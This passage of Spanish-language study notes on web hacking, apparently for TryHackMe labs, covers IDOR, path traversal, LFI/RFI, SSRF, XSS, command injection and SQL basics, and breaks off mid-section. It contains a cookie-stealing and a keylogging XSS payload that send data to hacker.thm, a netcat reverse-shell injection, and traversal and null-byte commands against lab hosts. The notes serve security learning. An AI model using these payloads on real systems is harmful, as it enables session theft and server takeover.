Por otra parte y debido al peligro que representan, en muchas ocasiones podemos encontrarnos las cookies codificadas (Encoding) o hasheadas (Hashing). Ambos son mecanismos de transformación de la información pero la diferencia fundamental estriba en que el encoding es una transformación básica e inmediatamente reversible mientras que el hashing no conserva la totalidad de la información y por tanto es teóricamente imposible volver a recuperar los datos originales.

Para crackear una cookie hasheada o encodeada tenemos diferentes herramientas como [Decodify](https://github.com/s0md3v/Decodify), [JohnTheRipper](https://github.com/openwall/john), [Hashcat](https://github.com/hashcat/hashcat), [Crackstation](https://crackstation.net/) o [CyberChef](https://gchq.github.io/CyberChef/) ya tratadas en partes de paths anteriores. 

<br />

#### 2.5. IDOR.

**Intro**

El término *IDOR* atiende a *Insecure Direct Object Reference* y es un tipo de vulnerabilidad de control de acceso. Estas se producen cuando el servidor recibe input del cliente (data, files, documents) para acceder a un objeto y no realiza la validación adecuada permitiendo un hipotético acceso no autorizado. 

Por ejemplo. Supongámos que tenemos una aplicación web que contiene un botón que nos lleva a nuestro portal del usuario. Cuando accedemos, la URL posee el siguiente valor:

```defaul
https://insecure-website/profile?user=1205
```

El valor del parámetro 'user' define el portal al que se está accediendo, cada usuario tiene un número asociado. Por tanto, podríamos cambiar dicho número y si la aplicación no valida que el usuario que intenta acceder a un recurso es de hecho el propietario del recurso o tiene algún tipo de autorización (es decir, es vulnerable a IDOR) obtendríamos como resultado el acceso no autorizado al portal de otro usuario.

De esta forma, *en definitiva el IDOR es el acceso no autorizado a un recurso de una aplicación web debido a la falta de validación sobre la relación que guarda el usuario con los datos que el mismo utiliza para acceder al recurso de marras*. 

<br />

**Encoded IDs**

Cuando pasamos datos a una aplicación web, generalmente los desarrolladores configuran la misma para codificar los datos previamente. Esto asegura la integridad de los datos.

La codificación transforma los datos, transmitidos como un stream de bytes, en caracteres ASCII. La técnica más común de cifrado es 'base64'. Para emplearla existen multitud de herramientas, tanto online:  [base64decode.org](https://www.base64decode.org/), [base64encode.org](https://www.base64encode.org/) como herramientas de línea de comandos: [base64](https://ubunlog.com/en/base64-codificacion-decodificacion-terminal/)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220812125903.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Hashed IDs**

Los datos en vez de codificados también pueden estar pasados por una función de hash, en tal caso es más complicado obtenerlos de vuelta sin una lista de posibles candidatos.

<br />

**Practice Example**

Por ejemplo, supongámos que tenemos una aplicación web en la que tenemos un usuario creado y un espacio personal tipo "Portal".

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220812134715.png' | relative_url }}" text-align="center"/>
</div>

Al acceder a este apartado y observar la pestaña "Network" vemos las conexiones que el navegador realiza a la hora de procesar y renderizar el HTTP response:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220812135159.png' | relative_url }}" text-align="center"/>
</div>

Entre ellas, observamos un GET que contiene un parámetro que, intuimos, está relacionado con la identidad del usuario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220812135321.png' | relative_url }}" text-align="center"/>
</div>

Así, copiamos y pegamos la URL en la barra de nuestro navegador y obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220812135506.png' | relative_url }}" text-align="center"/>
</div>

Si cambiamos el valor del parámetro "id", al ser la aplicación web vulnerable a IDOR, obtenemos acceso a información de otros usuarios:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220812135606.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220812135642.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 2.6. File Inclusion.

**Introducción**

En esta sección vamos a obtener las nociones básicas para lleva a cabo explotación de vulnerabilidades LFI (Local File Inclusion), RFI (Remote File Inclusion), y Directory Traversal.

Antes de introducirnos en el mecanismo de esta clase de vulnerabilidades es necesario ver someramente cómo un usuario interactúa con una aplicación web. 

Para interactuar con un servidor web se ha de construir una request HTTP que un navegador fabrica mediante una instrucción. Esta instrucción es la URL:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220813113033.png' | relative_url }}" text-align="center"/>
</div>

En ella se explicita el protocolo sobre el que se realiza la request, el dominio al que va dirigida y diferentes parámetros que especifican el recurso al que se quiere acceder de la aplicación web cuando se emplea un método HTTP concreto denominado GET.

Los parámetros GET incluyen en primer lugar una interrogación '?' a modo de indicador que comienzan los parámetros que tienen indicado por un lado el nombre 'file' y su valor, 'userCV.pdf'.

De esta forma, la instrucción es procesada por el navegador que emite una HTTP-GET request al servidor que devuelve una HTTP response en la que se encuentra el acceso al recurso solicitado:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220813115730.png' | relative_url }}" text-align="center"/>
</div>

Este mecanismo puede no tener las medidas de seguridad adecuadas permitiendo a un hipotético atacante acceder al contenido de distintos ficheros con información sensible o incluso ejecutar ficheros dentro del sistema. 

<br />

**Path Traversal**

*Path Traversal*, también conocido como *Directory Traversal* es un tipo de vulnerabilidad web que permite a un atacante acceder al contenido de un fichero o archivo sensible. 

Esta vulnerabilidad se produce cuando el input que el usuario introduce en una request que es llevada a una función de lectura de archivos (como file_get_contents en PHP) no se valida correctamente, previniendo que un usuario acceda de forma no autorizada a los contenidos de un fichero con información sensible (como /etc/passwd).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220813143527.png' | relative_url }}" text-align="center"/>
</div>

Esto puede variar para cada caso, pero la función de lectura de archivos suele buscar el fichero en cuestión en un directorio concreto del estilo /var/www/html. De esta forma, el usuario de la imagen anterior introduce ../../../../ para retroceder cuatro directorios en lo que se supone que es un sistema linux y luego acceder al fichero /etc/passwd.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220813144851.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220813144931.png' | relative_url }}" text-align="center"/>
</div>

<br />

Por otra parte, en una aplicación que corre en un Windows Server, el atacante necesita proporcionar paths correctos de Windows. Así, si el usuario quiere leer el fichero *boot.ini* localizado c:\\boot.ini entonces:

```bash
http://webapp.thm/get.php?file=../../../../boot.ini
```

Algunos de los ficheros que podemos probar a extraer haciendo pruebas son:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220813162722.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Local File Inclusion - LFI**

La vulnerabilidad web Local File Inclusion tiene un mecanismo parecido a Directory Traversal. Esencialmente consiste en llegar a un recurso de la aplicación web para obtener de la misma un comportamiento que beneficie al usuario, con la diferencia de que, mientras que el Directory Traversal sólo permite leer recursos, el Local File Inclusion admite la incrustación de código en el servidor que puede llevar a ejecución remota de código. 

Técnicamente, un LFI se distingue porque maneja el input del usuario a través de una file inclusion instruction como *include*, *require*, *include_once*, etc sin validación previa:

```php
<?PHP 
	include($_GET["lang"]);
?>
```

Un dato a tener en cuenta es que estas vulnerabilidades están estrechamente asociadas con otras como el File Upload vulnerability y además en sí mismas generalmente no constituyen una vulnerabilidad, sino una debilidad (que se diferencia de la anterior porque en sí misma no constituye un peligro para la integridad del dispositivo). Una cadena de varias debilidades como por ejemplo una File Upload vulnerability y un Local File Inclusion vulnerability constituyen una vulnerabilidad en sí misma. 

Así por ejemplo, imaginemos que hemos subido un fichero PHP a un servidor debido a que es vulnerable a un File Upload vulnerability. Además, para que el ataque tenga efecto, es necesario ejecutar el código del mismo accediendo a su contenido mediante el Local File Inclusion vulnerability. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220813222120.png' | relative_url }}" text-align="center"/>
</div>

Este es un ejemplo de como dos debilidades que en sí mismas no son suficientes para perpetrar un ataque se convierten en una vulnerabilidad grave cuando se dan conjuntamente.

En casos prácticos no es cierto que no se realice ningún tipo de validación sobre nuestro input pero esto tampoco quiere decir que no se pueda realizar un bypass en ciertos contextos. 

- *Information leak*: En algunos casos, introducir input inválido puede llevar a gaps de información que nos pueden ayudar a la hora de perpetrar el ataque:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220814103338.png' | relative_url }}" text-align="center"/>
</div>

- *Null Byte Injection*: En muchos casos puede ocurrir que soliciten que el archivo al que se intenta acceder tenga una extensión concreta (como .jpeg, .png) o directamente nuestro input se incruste dentro de una instrucción que le adhiere automáticamente una extensión:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220814103836.png' | relative_url }}" text-align="center"/>
</div>

	De esta forma, podemos probar a introducir un Null Byte cuya representación es: %00. Esto desencaja cualquier cosa que vaya después del valor que antecede al Null Byte.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220814105614.png' | relative_url }}" text-align="center"/>
</div>

- *Filter replacement*: Puede ocurri que nuestro input pase a través de un código que quite términos como "../" cuando se los encuentra. De esta forma podemos duplicar tales términos para que no sean borrados en el proceso:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220814134255.png' | relative_url }}" text-align="center"/>
</div>

	<br />

**Remote File Inclusion**

RFI o Remote File Inclusion es una técnica para incluir ficheros remotos dentro de una aplicación web vulnerable. Esta, al igual que ocurría con el LFI, se produce porque el input del usuario se introduce sin saneamiento adecuado en una file-inclusion function con la diferencia de que en el LFI se incluían ficheros locales del servidor, mientras que en el RFI se incluyen ficheros remotos. 

En términos muy simples, el método consiste en que la aplicación web accede al contenido de un fichero que se aloja en un servidor externo y cuyo código pasa a una función "include" y posteriormente ejecuta:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220814234914.png' | relative_url }}" text-align="center"/>
</div>

Literalmente se ejecuta un fichero remoto en el servidor que hostea la aplicación web. 

La imagen anterior resume los pasos:

1. El atacante instruye a la web a descargarse un fichero php malicioso (reverse shell).
2. La aplicación web realiza una solicitud de descarga de dicho fichero al servidor bajo control del atacante.
3. El fichero malicioso es descargado por la aplicación web.
4. La aplicación web pasa el contenido de dicho fichero a un include (tal y como ocurría en el LFI) y lo ejecuta, provocando que el atacante tome control efectivo de la aplicación web. 

Observemos que en el LFI es necesario combinarlo con un File Upload vulnerability porque se ejecuta un fichero local, mientras que en el RFI no es necesario. Esto provoca que el RFI sea una vulnerabilidad como tal y una debilidad. 

<br />

**Resúmen**

Así, en términos muy breves podemos repasar las debilidades aprendidas y resumirlas de la siguiente manera:

- *Directory Traversal*: Permite incluir en una página el contenido de un fichero no autorizado manipulando la ruta de un elemento HTML o una función que incluya ficheros del servidor debido a la falta de saneamiento por parte del servidor sobre el input del usuario.

- *LFI*: Permite la lectura o ejecución de un fichero del servidor pasándo el nombre del mismo fichero sobre una file-inclusion-function ("include" por ejemplo en PHP) que puede incluir el contenido del fichero sobre el documento HTML o puede incrustar el código PHP, Java, Python, etc sobre las instrucciones del servidor web provocando ejecución de código.

- *RFI*: Consiste esencialmente en un LFI que admite la descarga de un fichero remoto generalmente en la máquina local del atacante. Este fichero se pasa sobre una file-inclusion-function y su código se ejecuta en el servidor que hostea la aplicación web.

	<br />
	
**Challenge**

Tenemos una serie de retos en los que debemos hacer uso de las habilidades aprendidas para resolverlos:

- *Challenge 1*: El primer reto nos informa de que el GET method está roto y que debemos emplear el método POST. Para ello utilizamos el comando *curl*:


	```bash
	curl http://10.10.98.76/challenges/chall1.php -X POST -d file=/etc/flag > file.html && firefox --new-tab=file:///root/Desktop/file.html
	```

	Este comando lleva a cabo una request tipo POST donde lleva en el cuerpo un parámetro file cuyo valor es /etc/flag1 y llevamos el output sobre un fichero que posteriormente abrimos con firefox:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814195933.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

- *Challenge 2*: En primer lugar, al acceder al contenido de este challenge observamos que la página despliega un mensaje:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814210141.png' | relative_url }}" text-align="center"/>
	</div>

	Nos avisa de que tenemos el rol de "Invitiado" y revisando las cookies observamos de que existe una que contiene dicho valor. Así, presumimos que al cambiar el valor de esta cookie también cambia nuestro rol, obteniendo:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814210319.png' | relative_url }}" text-align="center"/>
	</div>

	Hasta aquí parecería que estamos ante un punto muerto, sin embargo, alterando de nuevo el valor de la cookie obtenemos:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814210925.png' | relative_url }}" text-align="center"/>
	</div>
	
	Esto significa que el valor de la cookie se emplea para adherir el contenido de un fichero que se carga mediante una función de inclusión de archivos a la que se le pasa de nuevo el valor de nuestra cookie. De esta forma, podemos probar a ver si podemos extraer la flag mediante un LFI. Como la página dice que el path es /var/www/html y el mensaje de error nos informa de que la función busca el archivo específicamente en el directorio includes/, entonces lo pertienente es introducir cuatro "../" para retroceder al directorio / y por adición, debemos cortar la extensión que la propia instrucción adhiere al valor de nuestra cookie con un null byte "%00":

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814212115.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

- *Challenge3*: En este caso tenemos aparentemente una aplicación web fuertemente protegida por algún sistema de protección frente a LFI o Directory Traversal. Sin embargo, sólo se produce esta protección con el método HTTP-GET y no con el método HTTP-POST. De esta forma, empleamos el siguiente comando con curl:

	```bash
	curl -X POST -d file=../../../etc/flag3%00 http://10.10.69.172/challenges/chall3.php --output /tmp/file.html && firefox --new-tab=/tmp/file.html
	```

	Que tal y como hacía el otro, emplea curl para mandar un HTTP-POST para obtener el fichero, guardar el documento html en un fichero y abrirlo con un navegador, obteniendo:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814224541.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

- *Challenge 4*: En este caso se nos pide que llevemos a cabo un RFI, o remote file inclusion. Esto supone hacer que el servidor ejecute el contenido de un fichero remoto, que será concretamente una reverse shell en PHP.

	Para ello, en primer lugar, creamos un fichero PHP con el código dentro: 
	
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814233320.png' | relative_url }}" text-align="center"/>
	</div>
	
	La intención es que la aplicación tenga acceso a este fichero y por ello montamos un servidor python en nuestra máquina local:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814233446.png' | relative_url }}" text-align="center"/>
	</div>

	Antes de forzar a la aplicación web a realizar una request para ejecutar el contenido del fichero (dado que se trata de una reverse shell) montamos un listener con netcat para poder manejar la sesión:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814233546.png' | relative_url }}" text-align="center"/>
	</div>

	Observemos que el puerto de escucha debe coincidir con el puerto al que se va a enviar la conexión; 1234 y, ahora sí, forzamos a la aplicación a la ejecución del fichero remoto shell.php:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814233714.png' | relative_url }}" text-align="center"/>
	</div>

	La página aparentemente se queda cargando, pero observamos que en el servidor http de python se ha accedido al fichero:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814233810.png' | relative_url }}" text-align="center"/>
	</div>

	Y en el listener de netcat se ha abierto una sesión:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220814233851.png' | relative_url }}" text-align="center"/>
	</div>

	En esencia lo que ha ocurrido es que la aplicación a accedido al código de nuestro fichero php y a ejecutado su código en el servidor que hostea la aplicación web dándonos una sesión en el listener de netcat. 

	<br />

#### 2.7. SSRF.

**Descripción**

SSRF son las siglas de Server-Side Request Forgery es una vulnerabilidad que permite a un atacante hacer que una aplicación web realice una conexión a un sitio de preferencia del atacante. 

Consiste esencialmente en la manipulación de una funcionalidad de la aplicación que realiza una conexión externa. La falta de validación sobre esta funcionalidad puede permitir que un atacante cambie la dirección sobre la que se realiza la conexión a un sitio de conveniencia del atacante.

Distinguimos entre Normal SSRF y Blind SSRF, el primero devuelve el output sobre al pantalla del atacante mientras que el segundo es ciego, la conexión se ejecuta pero esto no se refleja en al respuesta HTTP que recibe el atacante.

<br />

**Ejemplo**

El caso más típico, como hemos dicho, es el de una aplicación web que contiene una funcionalidad que adhiere a la página un código HTML que pide mediante una conexión HTTP.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220815095935.png' | relative_url }}" text-align="center"/>
</div>

El atacante manipula esta funcionalidad (interceptando la request o a través de otro mecanismo) para cambiar el destino de la conexión a un sitio de su conveniencia, seguidamente, el output de esa nueva conexión se refleja en el HTML response del atacante:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220815100645.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, el atacante puede provocar que la aplicación descarge código malicioso o puede acceder a un dispositivo desprotegido de la red interna de la aplicación (como un portal de administrador oculto), etc. 

Si en lugar 
<br />

**Finding an SSRF**

Es pertinente buscar el SSRF en todas aquellas localizaciones en las que exista un parámetro cuyo valor sea una URL ya sea completa o parcial:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220815111952.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 2.8. XSS. Cross-Site Scripting. 

**Intro**

Empezaremos diciendo que el XSS o Cross-Site Scripting es una vulnerabilidad basada en el lenguaje de programación JavaScript. Este es un lenguaje de programación que se encuentra esencialmente entre el código HTML de una página web y se procesa por el navegador de un usuario para generar cambios en la misma de forma dinámica sin necesidad de realizar otra request al servidor. 

Así, el XSS es un tipo de ataque en el que se inyecta JavaScript malicioso en una aplicación web con la intención de esta que se ejecute en el navegador de otros usuarios cuando visitan la página (cuando el navegador renderiza el document HTML con JavaScript malicioso).

<br />

**XSS Payloads**

Recordamos que un payload es aquella parte del exploit (generalmente código) que determina el propósito del ataque, es decir, define el comportamiento del dispositivo una vez hemos explotado la vulnerabilidad y hemos ganado control sobre el mismo.

Existen distintos tipos de payloads:

- *Proof Of Concept*: Estos tipos de payloads se emplean sólo para asegurar que la vulnerabilidad existe:

	```html
	<script>alert(1)</script>
	```

- *Session Stealing*: A menudo, las páginas web controlan la sesión del usuario almacenando piezas de información en el navegador (cookies, tokens, etc) que son extraibles mediante la instrucción correcta en JavaScript:

	```html
	<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
	```

- *Key Logger*: Un keylogger es un tipo de malware, código malicioso, que captura, guarda y envía las teclas que pulsa un usuario a un atacante. De esta forma se pueden reconstruir piezas de inforamación sensible:

	```html
	<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
	```

	<br />

**Reflected XSS**

El *Reflected XSS* es un tipo de XSS en el que el payload JavaScript malicioso se incluye a modo de elemento HTML (\<script>) en el documento HTML que recibe el cliente y que se procesa en su navegador.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220815181302.png' | relative_url }}" text-align="center"/>
</div>

La imagen anterior suele resumir el caso típico:

1. Un atacante envía un link malicioso a una víctima ingenua.
2. La víctima clicka en el link. (Recordamos que un link no es más que una URL y esta a su vez no es más que una instrucción para que el navegador procese una HTTP request a un servidor externo. En este caso, el link contiene una parte maliciosa (que sería el payload) que hace que la respuesta HTML esté "envenenada)". 
3. El navegador del cliente procesa la instrucción del link y lleva a cabo una solicitud HTTP y recibe a modo de respuesta un documento HTML por parte del servidor web que contiene código JavaScript malicioso.
4. El código malicioso es ejecutado por el navegador de la víctima y realiza una acción que beneficia al atacante a costa del cliente que generalmente consiste en la apropiación de datos sensibles (como cookies, contraseñas, etc). 

	<br />

Los puntos en los que es pertienente buscar Reflected XSS consisten en:

- Parametros de la URL Query String.
- URL File Path.
- Cabeceras HTTP.

En general, cualquier apartado en el que el usuario pueda introducir "input" que se refleje en la respuesta HTML. 

<br />

**Stored XSS**

Este caso es semejante al anterior, existe código malicioso que se refleja como parte de una entidad HTML en la respuesta que recibe un cliente. Sin embargo, en este caso, el código malicioso se queda almacenado perpetuamente en la página web, como por ejemplo, en la sección de  comentarios de un foro.

Por tanto:

- En primer lugar tiene más alcance que un Reflected XSS ya que afecta a todo aquel usuario que se adentre en la página.
- Además, es más discreto ya que, a menudo, no existe nada raro en el link o la URL ha clickar que nos pueda inducir a pensar que se trata de un sitio malicioso. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220815183440.png' | relative_url }}" text-align="center"/>
</div>

Los sitios habituales para sospechar de un posible Stored XSS:

- Comentarios de un blog. 
- Perfil de usuario. 
- Listas de objetos de un sitio web. 

	<br />

**DOM Based XSS**

En términos muy simples, una DOM-based XSS es una vulnerabilidad de inyección de código JavaScript en el DOM de una página web. 

Por otra parte, el DOM son las siglas de Document Object Model y es una interfaz que interpreta el documento HTML en términos de objetos

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220815214949.png' | relative_url }}" text-align="center"/>
</div>

y admite la ejecución de código JavaScript para cambiar los objetos que constituyen el documento HTML de forma dinámica en función de la interactuación del usuario sin necesidad de pasar por el servidor. 

Así, se puede decir que el DOM-based  XSS se caracteriza por la ejecución de JavaScript malicioso directamente en el navegador sin necesidad de que se carguen nuevas páginas o se envíen datos al código de back-end. La ejecución del payload se produce cuando el usuario interactúa de una determinada manera con la página haciendo que su navegador procese el código malicioso.

Generalmente y en un sentido más técnico, se puede decir que existe una vulnerabilidad DOM XSS cuando existe una ruta ejecutable desde una fuente (una función que recoge input del usuario) a un sumidero (función que realiza un procesamiento del mismo, como por ejemplo eval()) de código JavaScript sin saneamiento de por medio.

<br />

**Blind XSS**

Blind XSS es una vulnerabilidad XSS cuya validez no puede ser testeada previamente. Sin embargo todavía es posible testearlas con herramientas como [xsshunter](https://xsshunter.com/).

<br />

**Perfecting your payload**

Veamos algunos ejemplos de vulnerabilidades XSS y cómo testearlos:

- El primer caso es sencillo, tenemos un campo en el que introducir input y seguidamente este se refleja en el contenido HTML de la página web. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816103652.png' | relative_url }}" text-align="center"/>
	</div>

	De esta forma, si nuestro input no se validase, podríamos efectuar la inyección de un elemento HTML como \<script>alert(1)\</script>:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816103723.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

- En este segundo caso, nuestro input se ve reflejado no como valor de una entidad sino como valor de un atributo de una entidad:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816104059.png' | relative_url }}" text-align="center"/>
	</div>

	De esta forma, si intentásemos inyectar una entidad HTML, el resultado podría verse entorpecido precisamente a que dicho código se estaría introduciendo como valor de un atributo. Así, primero cerramos el atributo y posteriormente inyectarmos el elemento HTML (si nuestro input no recibiese validación alguna):

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816104323.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816104344.png' | relative_url }}" text-align="center"/>
	</div>

	En la imágen anterior puede verse como nuestro input tiene la forma:

	```html
	"><script>alert('THM')</script>
	```

	Con la primera cerramos el elemento HTML y con la segunda inyectamos nuestro elemento.

	<br />

- En este tercer caso tenemos que nuestro input se pone en una etiqueta "\<textarea>" que bloquea la introducción de cualquier elemento HTML. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816142411.png' | relative_url }}" text-align="center"/>
	</div>

	Sin embargo, de nuevo como nuestro input se introduce sin validación podemos cerrar dicha etiqueta e inyectar código malicioso.

	<br />

- En este caso, nuestro input se introduce en un script de JavaScript:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816143011.png' | relative_url }}" text-align="center"/>
	</div>

	De esta forma, cerramos la etiqueta script y seguidamente inyectamos código malicioso:

	```html
	'</script><script>alert('THM')</script>
	```
	
	<br />

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816143140.png' | relative_url }}" text-align="center"/>
	</div>

	También podríamos haber introducido el siguiente payload que habría tenido el mismo efecto:

	```javascrip
	';alert('THM');//
	```

	Con esto en lugar de inyectar HTML inyectamos javascript en la misma etiqueta script HTML. Concretamente, cerramos el script con '; y a continuación introducimos el alert('THM'); y comentamos el resto del código con //.

	<br />
	
- En este caso, existe una forma de validación en la que se elimina el término "script" de nuestro input cuando es detectado:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816144358.png' | relative_url }}" text-align="center"/>
	</div>

	Así la solución pasa por introducirlo intercalado: "scrscriptipt". Así se elimina el primer término "script" y se incrusta una etiqueta script HTML. 

	<br />
	
- Por último, podemos incrustar un evento que ejecuta javascript cuando se cumplen una serie de condiciones que por otra parte dependen del evento escogido como onmouseover, onload, etc. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220816145001.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

#### 2.9. Remote Code Execution. 

**Intro**

Command Injection o Remote Code Execution (RCE) es un tipo de ataque en el que se explota una vulnerabilidad para conseguir la ejecución de comandos en el servidor que hostea la aplicación web. 

Estos comandos se ejecutan mediante el usuario que está ejecutando el servidor web que con frecuencia suele ser www-data. 


<br />

**Discovering Command Injection**

Estas vulnerabilidades existen porque las aplicaciones web tienen funcionalidades que pasan input del usuario sin validar sobre código PHP, Java, Python, etc que realiza "system calls" sobre la máquina servidor, o lo que es lo mismo, llaman a una función que ejecuta comandos del sistema operativo como Exec, Passthru, System.

Por ejemplo, supongámos que existe un parámetro denominado "$title" que recoge input del usuario y se pasa sobre el siguiente código PHP:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220816180837.png' | relative_url }}" text-align="center"/>
</div>

Observemos por tanto que lo que se hace es intercarlar el input del usuario sobre un OS Command, concretamente lo intercala sobre un "grep":

```bash
grep $title /var/www/html/songtitle.txt 
```

De esta forma, si el input del usuario no se validase, se podría cortar el comando e inyectar uno propio malicioso, por ejemplo: 

$title=; nc \<IP> -e /bin/bash; 

```bash
grep; nc <IP> -e /bin/bash; /var/www/html/songtitle.txt 
```

Y como resultado obtendríamos una reverse shell en bash. Observemos que el payload varía en función del comando en el que el input se intercale. En general, si no tenemos acceso al código fuente lo más habitual es probar con los siguientes combinadores de comandos:

- ';'.
- '&'
- '&&'
- '|'
- '||'

<br />

**Finding and testing RCE**

Existen dos tipos RCE:

- Verbose, el output se devuelve al usuario. 
- Blind, el output no se devuelve al usuario. 

El verbose evidentemente se detecta intentando ver si se devuelve el output del comando whoami, hostname, etc en el caso de Linux o whoami, dir, timeout, etc en Windows. 

Sin embargo, para detectar un blind RCE es algo más complicado y se hacen uso de las siguientes técnicas:

- *Ping*: Se emplea el comando ping o sle-ep para comprobar si la página sufre un retardo en carga, indicio de que el comando ping se ha ejecutado y de que por tanto es vulnerable a RCE. 
- *Forcing Output*: Podemos intentar crear un fichero con algún contenido como por ejemplo:

	```bash
	echo whoami > /var/www/html/images/whoami.txt
	```

	De esta forma, si tenemos permisos de escritura sobre ese directorio en el que supuestamente se guardan ficheros de imagen a los que posteriormente podemos acceder mediante un LFI o Directory Traversal, podremos saber si se ha ejecutado el comando que hemos inyectado.

- *Curl*: Podemos emplear el comando curl para realizar una request y testear inyección de comandos:

	```bash
	curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
	```
	
	<br />

#### 2.10. SQL Injection.

**Intro**

SQL responde a Structured Query Language, o Lenguaje de Búsqueda Estructurado, empleado para realizar búsquedas de información almacenada en una base de datos. Por otra parte, en términos estrictos, el SQLi consiste en un RCE sobre un DBMS.

Es decir, es una inyección de comandos SQL sobre un programa que gestiona una o múltiples bases de datos (DBMS o SGBD en español) que permite obtener de manera ilícita información sensible generalmente asociada a una aplicación web o a un servidor. 

Conviene señalar que no se trata de una vulnerabilidad del SGBD, este no es más que un programa que recibe instrucciones del servidor web que a su vez recibe el input del cliente que interacciona con la aplicación web. Es decir, el SQLi se produce fundamentalmente por un fallo de validación del input en el servidor web, el cual pasa dichos datos maliciosos al SGBD que los procesa y devuelve más información de la cuenta de manera inintencionada. No es concretamente una vulnerabilidad de código SQL, sino del lenguaje de programación en el que esté escrito el servidor web; Python, Java, PHP, etc.  

<br />

**DBMS (SGBD). Databases. Tables**

Un *SGBD* es un programa que mediante el uso de instrucciones en un lenguaje de programación, que suele ser SQL o un derivado del mismo, gestiona la información y los objetos que existen dentro de una o varias bases de datos.

Una *base de datos* es una forma digitalmente organizada de guardar información a partir de una serie de objetos coherentemente definidos unos respecto de otros. Concretamente nos interesan las *bases de datos relacionales*, que son aquellas que guardan información relacionada entre sí en torno a un concepto "real" (alumnos, casas, dinero, etc) donde el objeto de organización principal son las *tablas*. 

Así, el caso típico es el de un servidor que contiene un SGBD en ejecución que gestiona diversas bases de datos relacionales con información acerca de un campo concreto que contienen una o varias tablas con información sobre un concepto específico:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220816235550.png' | relative_url }}" text-align="center"/>
</div>

Por otra parte, el lenguaje SQL interacciona con los elementos que componen una tabla y por tanto, para entender la sintaxis del código (cuestión necesaria para comprender el SQLi), es necesario entender los componentes de una tabla de una base de datos relacional. 

Una *tabla* es una representación gráfica de un conjunto de elementos del mismo tipo (alumnos, viviendas, plantas, etc) 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220817141841.png' | relative_url }}" text-align="center"/>
</div>

Se compone de filas y columnas de forma que las filas se corresponden con los *registros* y las columnas con los *campos* y estos objetos están relacionados de la siguiente manera:

- Un *registro* representa la información global que se tiene de un elemento concreto la cual se encuentra clasificada entre los diferentes *campos* de la tabla.
        
	<div style="text-align:center">
